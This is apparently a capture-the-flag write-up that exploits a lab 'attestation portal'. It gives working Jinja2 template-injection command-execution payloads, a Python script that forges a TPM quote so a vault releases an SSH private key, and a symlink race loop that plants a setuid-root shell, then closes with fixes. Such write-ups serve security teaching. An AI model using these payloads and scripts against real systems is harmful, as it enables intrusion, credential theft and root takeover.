# KeyStone-User

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{tr0st_but_v3rify_the_endors3ment}`

---

## TL;DR

1. **Jinja2 SSTI** in the `/review?doc=` parameter → RCE as `webapp`.
2. The internal TPM "vault" verifies a quote signature against a **client-supplied** attestation key and never binds it to the real TPM's endorsement key (EK) - a deliberate missing *credential activation* step. Forge a TPM2 quote with your own RSA key → vault releases **tpm-admin's SSH private key** → `user.txt`.
3. `measure-and-run` (sudo, NOPASSWD) has a **TOCTOU double-open race**: it hashes a path, then re-opens the *same path* 20 ms later to `fexecve` it. Swap a symlink from an allowlisted binary to a payload during the window → code execution as **root** → `root.txt`.

---

## 1. Recon

```bash
nmap -Pn -n -sV -sC -p- 10.48.177.211
```

Only two ports open:

| Port | Service |
|------|---------|
| 22   | OpenSSH 9.2p1 (Debian 12) |
| 80   | nginx 1.22.1 → "Keystone - Attestation Portal" (Flask) |

The homepage describes an attestation-gated secret vault:

- Internal vault at `127.0.0.1:9000` that "only releases secrets to attested clients".
- A software TPM (`swtpm`) socket on `127.0.0.1:2321`.
- A `/review?doc=<name>` document viewer with links to `welcome`, `changelog`, `operators`, `deprecation`.

### Key leaks from the docs

- **changelog:** *"2026-10-02 … added **Jinja2 render on /review**. Risk accepted - docs are trusted."* and *"vault is treating the client-supplied AK as trusted after signature verification only."*
- **operators:** vault source is at `/opt/vault/main.go`; AK persisted at TPM handle `0x81000001`; `measure-and-run` is a sudo helper that extends **PCR 23** before running a measured binary; allowlist at `/etc/measure/allowed-hashes.txt` owned by `tpm-admin`.

---

## 2. SSTI → RCE (user `webapp`)

Path traversal on `doc` was blocked ("no such document"), but the value is rendered through Jinja2, and the "no such document" page echoes it back:

```bash
curl -sG http://10.48.177.211/review --data-urlencode "doc={{7*7}}"      # -> 49
curl -sG http://10.48.177.211/review --data-urlencode "doc={{7*'7'}}"    # -> 7777777
```

Confirmed SSTI. `os` is reachable through `cycler`'s globals, giving RCE:

```bash
curl -sG http://10.48.177.211/review \
  --data-urlencode "doc={{cycler.__init__.__globals__.os.popen('id').read()}}"
# uid=1001(webapp) gid=1001(webapp) groups=1001(webapp),994(tpm)
```

Running as `webapp` (host `keystone`, cwd `/opt/webapp`), a member of the `tpm` group.

> A small base64 wrapper made command execution reliable (the Flask dev server is single-threaded and occasionally stalls). Larger files were staged by hosting them over HTTP on the VPN interface and `curl`-ing them from the target, since long SSTI URLs get truncated.

### Target layout

- `/opt/webapp/portal.py` - the Flask portal (our RCE context).
- `/opt/vault/{main.go,vault,README.md}` - the Go vault (readable).
- `/etc/keystone/` - `README.md`, `ak.pub`, `sealed.txt` (not readable as `webapp`).
- **User flag:** `/home/tpm-admin/user.txt` (`-rw-r----- tpm-admin:tpm-admin`) - need to be `tpm-admin`.

---

## 3. Forging the TPM attestation → tpm-admin

### The vulnerability (VAULT-114)

`/opt/vault/main.go` implements a 3-step attestation protocol on `127.0.0.1:9000`:

```
POST /attest  {ak_pub_pem}          -> {session, nonce, expected_pcrs, expected_digest}
POST /verify  {session, quote_msg, quote_sig} -> {token}
GET  /secret?token=...              -> {payload}
```

`/verify` checks:
1. `quote_sig` verifies (RSA PKCS#1 v1.5 / SHA-256) against the **AK pubkey the client sent to `/attest`**,
2. parsed `TPMS_ATTEST` magic == `TPM_GENERATED_VALUE` (`0xFF544347`),
3. type == `TPM_ST_ATTEST_QUOTE` (`0x8018`),
4. `extraData` == `nonce`,
5. `pcrDigest` == `SHA256(pcr0 || pcr1 || pcr7)`, with all three pinned to **all-zero** (software-TPM golden state).

The comment and README say it plainly: there is **no credential activation** (`TPM2_MakeCredential` / `ActivateCredential`) binding the client AK to the system EK. So an attacker can present *any* RSA key, sign a *forged* `TPMS_ATTEST` that references the expected (zero) PCR values, and the vault accepts it.

### Exploit

Since the vault only listens on localhost, the exploit runs on the target (via the SSTI RCE). `cryptography` and `requests` are available on the box.

```python
import struct, base64, binascii, requests
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://127.0.0.1:9000"

# 1) our own "AK"
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_pem = priv.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()

# 2) /attest
a = requests.post(f"{BASE}/attest", json={"ak_pub_pem": pub_pem}).json()
nonce           = binascii.unhexlify(a["nonce"])
expected_digest = binascii.unhexlify(a["expected_digest"])

# 3) craft TPMS_ATTEST (ATTEST_QUOTE). Parser accepts pcrSelect.count = 0.
def blob16(b): return struct.pack(">H", len(b)) + b
buf  = struct.pack(">I", 0xFF544347)   # magic  TPM_GENERATED_VALUE
buf += struct.pack(">H", 0x8018)       # type   TPM_ST_ATTEST_QUOTE
buf += blob16(b"")                     # qualifiedSigner (empty TPM2B_NAME)
buf += blob16(nonce)                   # extraData = nonce
buf += b"\x00"*17                      # TPMS_CLOCK_INFO
buf += b"\x00"*8                       # firmwareVersion
buf += struct.pack(">I", 0)            # TPML_PCR_SELECTION count = 0
buf += blob16(expected_digest)         # pcrDigest

# 4) sign SHA256(buf) with our key
sig = priv.sign(buf, padding.PKCS1v15(), hashes.SHA256())

# 5) /verify -> token
tok = requests.post(f"{BASE}/verify", json={
    "session": a["session"],
    "quote_msg": base64.b64encode(buf).decode(),
    "quote_sig": base64.b64encode(sig).decode()}).json()["token"]

# 6) /secret -> sealed payload
print(requests.get(f"{BASE}/secret", params={"token": tok}).json()["payload"])
```

The vault released the **tpm-admin SSH private key** (ed25519). Save it and log in:

```bash
chmod 600 tpm-admin.key
ssh -i tpm-admin.key tpm-admin@10.48.177.211
cat /home/tpm-admin/user.txt
# isfcr{tr0st_but_v3rify_the_endors3ment}
```

---

## 4. TOCTOU race in `measure-and-run` → root

```
$ sudo -l
(root) NOPASSWD: /usr/sbin/measure-and-run *
```

The `~/race` directory was pre-staged with the intended exploit primitives:

```
safe            # copy of /bin/true  (sha256 c79bf442... -> ON the allowlist)
evil            # bash payload: cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
link -> evil    # symlink we will flip
```

### The bug

Decompiling `/usr/sbin/measure-and-run` (a setuid-invoked helper) reveals:

1. `open(argv[1])` → `mmap` + `SHA256` the **contents** of that path.
2. `tpm2_pcrextend 23:sha256=<hash>` (extend PCR 23).
3. Read `/etc/measure/allowed-hashes.txt`; `strcmp` the hash against each line.
4. On match: print `"policy ok, launching..."`, **`usleep(20000)`** (20 ms), then
5. **`open(argv[1])` *again* by path** → `fexecve()`.

Steps 1 and 5 open the **same path twice**, with a fixed 20 ms sleep in between - a textbook time-of-check / time-of-use race. If the path is a symlink pointing at `safe` during the hash/allowlist check but at `evil` during the re-open, the **allowlisted hash is approved** yet **the payload is executed as root**.

### Winning the race

Run `measure-and-run` repeatedly against the symlink while a tight loop flips `link` between `safe` and `evil`:

```bash
cd /home/tpm-admin/race
( while true; do ln -sfn evil link; ln -sfn safe link; done ) &   # toggler
for i in $(seq 1 4000); do
  sudo /usr/sbin/measure-and-run /home/tpm-admin/race/link >/dev/null 2>&1
  [ -u /tmp/rootbash ] && { echo "WON after $i"; break; }
done
```

- hash=`safe`, reopen=`evil` → **win** (payload runs as root)
- hash=`evil` → hash not on allowlist, aborts harmlessly
- both=`safe` → runs `/bin/true`, harmless

Won after **10 attempts**. A setuid-root bash was dropped:

```bash
ls -l /tmp/rootbash          # -rwsr-xr-x root root
/tmp/rootbash -p -c 'id; cat /root/root.txt'
# uid=1003(tpm-admin) euid=0(root)
# isfcr{a_pcr_is_a_promise_not_proof}
```

---

## Root cause summary

| Stage | Flaw | Fix |
|-------|------|-----|
| Portal | Untrusted input rendered through Jinja2 (`/review?doc=`) | Never template user input; use `render_template` with context, or a static whitelist |
| Vault | Attestation accepts a client-supplied AK with no EK binding (no MakeCredential/ActivateCredential) | Bind the AK to the platform EK via credential activation before trusting a quote |
| measure-and-run | TOCTOU: hashes a path, then re-opens it by path to exec | Open once, verify and `fexecve` the **same fd** (never re-resolve the path); drop the sleep |

## Themes behind the flag text

- **User - ** *"trust but verify the endorsement"*: the vault verified a signature but never verified the **endorsement** (EK) behind the key.
- **Root - ** *"a PCR is a promise not proof"*: extending/checking a PCR value proves nothing about what actually runs after the measurement when the file can be swapped.

